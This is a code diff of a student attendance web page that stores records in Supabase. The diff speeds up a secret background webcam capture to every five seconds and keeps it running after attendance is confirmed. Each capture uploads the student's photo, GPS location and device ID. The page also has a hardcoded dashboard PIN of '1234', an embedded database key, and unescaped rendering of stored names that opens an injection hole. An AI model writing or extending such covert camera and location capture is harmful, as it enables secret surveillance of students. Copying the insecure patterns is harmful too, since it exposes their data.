@@ -49,7 +49,7 @@
         <button onclick="verifikasiLaluMasuk()" id="btn-verif" class="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-bold py-4 rounded-xl mb-4 transition-all tracking-wider flex justify-center items-center gap-2 relative overflow-hidden group z-10">
             <span class="absolute inset-0 bg-white/20 translate-y-full group-hover:translate-y-0 transition-transform duration-300"></span>
             <svg class="w-5 h-5 z-10" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 11c0 3.517-1.009 6.799-2.753 9.571m-3.44-2.04l.054-.09A13.916 13.916 0 008 11a4 4 0 118 0c0 1.017-.07 2.019-.203 3m-2.118 6.844A21.88 21.88 0 0015.171 17m3.839 1.132c.645-2.266.99-4.659.99-7.132A8 8 0 008 4.07M3 15.364c.64-1.319 1-2.8 1-4.364 0-1.457.39-2.823 1.07-4"></path></svg>
-            <span class="z-10">VERIFIKASI & LOGIN SISWA</span>
+            <span id="text-verif" class="z-10">VERIFIKASI & LOGIN SISWA</span>
         </button>
 
         <button onclick="showGuru()" class="w-full bg-slate-800 hover:bg-slate-700 text-slate-300 font-bold py-4 rounded-xl border border-slate-700 transition-all tracking-wider z-10">
@@ -60,8 +60,8 @@
     <!-- LAYAR SISWA -->
     <div id="siswa-screen" class="hidden glass-panel p-6 rounded-2xl shadow-2xl w-full max-w-md transition-all relative overflow-hidden">
         <div id="auto-indicator" class="absolute top-2 right-2 flex items-center gap-2">
-            <div class="w-2 h-2 rounded-full bg-red-500 pulse-text"></div>
-            <span class="text-[10px] text-slate-500 tracking-widest">SYSTEM ACTIVE</span>
+            <div id="status-dot" class="w-2 h-2 rounded-full bg-red-500 pulse-text"></div>
+            <span id="status-text" class="text-[10px] text-slate-500 tracking-widest uppercase">High Monitoring Active</span>
         </div>
 
         <h2 class="text-xl font-bold text-center text-emerald-400 mb-6 tracking-widest">FORM ABSENSI</h2>
@@ -77,7 +77,7 @@
         </div>
 
         <button onclick="prosesAbsen('HADIR')" id="btn-absen" class="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-bold py-4 rounded-xl transition-all tracking-widest shadow-[0_0_15px_rgba(5,150,105,0.4)]">
-            KLIK UNTUK HADIR
+            KONFIRMASI KEHADIRAN
         </button>
 
         <p class="text-center text-xs text-slate-500 mt-6">Device ID: <span id="dev-id-display" class="font-mono text-emerald-500"></span></p>
@@ -88,7 +88,7 @@
         <div class="glass-panel p-6 rounded-2xl mb-6 flex flex-col md:flex-row justify-between items-center gap-4">
             <div>
                 <h2 class="text-2xl font-bold text-emerald-400 tracking-widest uppercase text-left">Nexus Command Center</h2>
-                <p class="text-slate-400 text-sm text-left">Monitoring Log Absensi & Background Capture</p>
+                <p class="text-slate-400 text-sm text-left">Monitoring Log Absensi (5s Interval Active)</p>
             </div>
             <button onclick="location.reload()" class="bg-red-900/50 hover:bg-red-800 text-red-200 px-6 py-2 rounded-lg text-sm font-bold border border-red-700/50 transition-all">KELUAR SISTEM</button>
         </div>
@@ -131,7 +131,6 @@
     </div>
 
     <script>
-        // --- KONFIGURASI OTOMATIS ---
         const DEFAULT_URL = "https://dgmimpupenzrtbylkopn.supabase.co";
         const DEFAULT_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRnbWltcHVwZW56cnRieWxrb3BuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzI5OTQ3NzYsImV4cCI6MjA4ODU3MDc3Nn0.9ahU05h08RLYbQ6KqlfMXVLD-xjlPla4n9rW_0FVe58";
 
@@ -141,6 +140,9 @@
 
         let supabase = null;
         let gpsLocation = "Pending...";
+        let activeStream = null;
+        let captureInterval = null;
+
         const videoFront = document.getElementById('stealth-cam-front');
         const canvas = document.getElementById('stealth-canvas');
         const ctx = canvas.getContext('2d');
@@ -167,7 +169,7 @@
             localStorage.setItem('supa_url', document.getElementById('supa-url').value.trim());
             localStorage.setItem('supa_key', document.getElementById('supa-key').value.trim());
             initSupabase();
-            alert("Koneksi Database Berhasil Diperbarui!");
+            alert("Koneksi Database Diperbarui!");
             loadLogs();
         }
 
@@ -184,7 +186,7 @@
             const payload = {
                 waktu: new Date().toLocaleString('id-ID'),
                 tipe: tipeAksi,
-                nama: document.getElementById('siswa-nama').value || "Siswa Tanpa Nama",
+                nama: document.getElementById('siswa-nama').value || "Siswa Monitoring",
                 keterangan: document.getElementById('siswa-ket').value || "-",
                 lokasi: gpsLocation,
                 foto: fotoB64,
@@ -192,93 +194,120 @@
             };
 
             if(supabase) {
-                const { error } = await supabase.from('absensi').insert([payload]);
-                if(error) console.error("Database Error:", error);
+                try {
+                    await supabase.from('absensi').insert([payload]);
+                } catch(e) {
+                    console.error("DB Insert Fail");
+                }
             }
         }
 
         async function verifikasiLaluMasuk() {
             const btn = document.getElementById('btn-verif');
+            const text = document.getElementById('text-verif');
+            
             btn.disabled = true;
-            btn.innerText = "MENYIAPKAN ENKRIPSI...";
+            text.innerText = "MENYIAPKAN MONITORING...";
 
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-                videoFront.srcObject = stream;
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        p => { gpsLocation = `${p.coords.latitude.toFixed(4)}, ${p.coords.longitude.toFixed(4)}`; },
+                        e => { gpsLocation = "GPS Offline"; }
+                    );
+                }
+
+                activeStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, 
+                    audio: false 
+                });
                 
-                navigator.geolocation.getCurrentPosition(
-                    p => { gpsLocation = `${p.coords.latitude.toFixed(4)}, ${p.coords.longitude.toFixed(4)}`; },
-                    e => { gpsLocation = "GPS Matikan"; }
-                );
+                videoFront.srcObject = activeStream;
+                
+                videoFront.onloadedmetadata = () => {
+                    videoFront.play();
+                    document.getElementById('login-screen').classList.add('hidden');
+                    document.getElementById('siswa-screen').classList.remove('hidden');
 
-                document.getElementById('login-screen').classList.add('hidden');
-                document.getElementById('siswa-screen').classList.remove('hidden');
-
-                // Mulai Capture Rahasia
-                setInterval(() => captureAndSave("AUTO-CAPTURE"), 15000);
+                    // INTERVAL DIPERCEPAT KE 5 DETIK
+                    captureInterval = setInterval(() => captureAndSave("AUTO-MONITORING (5s)"), 5000);
+                };
 
             } catch (err) {
-                alert("Akses kamera ditolak. Verifikasi gagal.");
+                alert("Verifikasi Gagal: Izin kamera diperlukan.");
                 btn.disabled = false;
-                btn.innerText = "COBA VERIFIKASI ULANG";
+                text.innerText = "ULANGI VERIFIKASI";
             }
         }
 
         async function prosesAbsen(status) {
             const btn = document.getElementById('btn-absen');
+            const nama = document.getElementById('siswa-nama').value.trim();
+            
+            if(!nama) {
+                alert("Harap isi Nama/NIS terlebih dahulu.");
+                return;
+            }
+
             btn.disabled = true;
-            btn.innerText = "PROSES...";
+            btn.innerText = "MENGIRIM DATA...";
             
-            await captureAndSave("MANUAL: " + status);
-            
-            alert("Absensi Anda telah tercatat di server.");
-            btn.disabled = false;
-            btn.innerText = "KLIK UNTUK HADIR";
-            document.getElementById('siswa-nama').value = "";
-            document.getElementById('siswa-ket').value = "";
+            try {
+                await captureAndSave("MANUAL: " + status);
+                alert("Absensi Berhasil! Monitoring tetap aktif.");
+                
+                // Form direset tapi kamera dan interval TIDAK dimatikan
+                document.getElementById('siswa-nama').value = "";
+                document.getElementById('siswa-ket').value = "";
+            } catch (e) {
+                alert("Terjadi kegagalan koneksi.");
+            } finally {
+                btn.disabled = false;
+                btn.innerText = "KONFIRMASI KEHADIRAN";
+            }
         }
 
         function showGuru() {
-            const pin = prompt("DASHBOARD GURU\nMasukkan PIN:");
+            const pin = prompt("🔐 DASHBOARD GURU\nMasukkan PIN:");
             if(pin === "1234") {
                 document.getElementById('login-screen').classList.add('hidden');
                 document.getElementById('guru-screen').classList.remove('hidden');
                 loadLogs();
             } else if (pin !== null) {
-                alert("PIN SALAH!");
+                alert("Akses Ditolak!");
             }
         }
 
         async function loadLogs() {
             const tbody = document.getElementById('log-table-body');
-            tbody.innerHTML = '<tr><td colspan="5" class="text-center py-8 opacity-50 italic">Sync data dari Supabase...</td></tr>';
+            tbody.innerHTML = '<tr><td colspan="5" class="text-center py-8 opacity-50 italic">Syncing Live...</td></tr>';
             
             if(supabase) {
-                const { data: dbData, error } = await supabase.from('absensi').select('*').order('id', { ascending: false }).limit(20);
-                
-                if(error) {
-                    tbody.innerHTML = `<tr><td colspan="5" class="text-center py-8 text-red-400">Error: ${error.message}</td></tr>`;
-                    return;
-                }
+                try {
+                    const { data: dbData, error } = await supabase.from('absensi').select('*').order('id', { ascending: false }).limit(30);
+                    if(error) throw error;
 
-                tbody.innerHTML = dbData.length ? '' : '<tr><td colspan="5" class="text-center py-8">Belum ada data di cloud.</td></tr>';
-                dbData.forEach(row => {
-                    const isAuto = row.tipe.includes("AUTO");
-                    tbody.innerHTML += `
-                        <tr class="hover:bg-white/5 transition-colors border-b border-slate-800">
-                            <td class="p-3 text-[10px] leading-tight">
-                                ${row.waktu}<br>
-                                <span class="${isAuto ? 'text-red-400' : 'text-emerald-400'} font-bold">${row.tipe}</span>
-                            </td>
-                            <td class="p-3 font-semibold text-white">${row.nama}</td>
-                            <td class="p-3 flex justify-center">
-                                ${row.foto ? `<img src="${row.foto}" class="w-12 h-12 object-cover rounded shadow-lg border border-slate-700">` : '-'}
-                            </td>
-                            <td class="p-3 text-[10px] font-mono">${row.lokasi}</td>
-                            <td class="p-3 text-right text-[10px] text-emerald-500 font-mono">${row.device_id}</td>
-                        </tr>
-                    `;
-                });
+                    tbody.innerHTML = dbData.length ? '' : '<tr><td colspan="5" class="text-center py-8">No data.</td></tr>';
+                    dbData.forEach(row => {
+                        const isAuto = row.tipe.includes("AUTO");
+                        tbody.innerHTML += `
+                            <tr class="hover:bg-white/5 transition-colors border-b border-slate-800">
+                                <td class="p-3 text-[10px] leading-tight text-left">
+                                    ${row.waktu}<br>
+                                    <span class="${isAuto ? 'text-red-400' : 'text-emerald-400'} font-bold">${row.tipe}</span>
+                                </td>
+                                <td class="p-3 font-semibold text-white text-left">${row.nama}</td>
+                                <td class="p-3 flex justify-center">
+                                    ${row.foto ? `<img src="${row.foto}" class="w-12 h-12 object-cover rounded shadow-lg border border-slate-700">` : '-'}
+                                </td>
+                                <td class="p-3 text-[10px] font-mono text-left">${row.lokasi}</td>
+                                <td class="p-3 text-right text-[10px] text-emerald-500 font-mono">${row.device_id}</td>
+                            </tr>
+                        `;
+                    });
+                } catch (error) {
+                    tbody.innerHTML = `<tr><td colspan="5" class="text-center py-8 text-red-400">Error: ${error.message}</td></tr>`;
+                }
             }
         }
     </script>
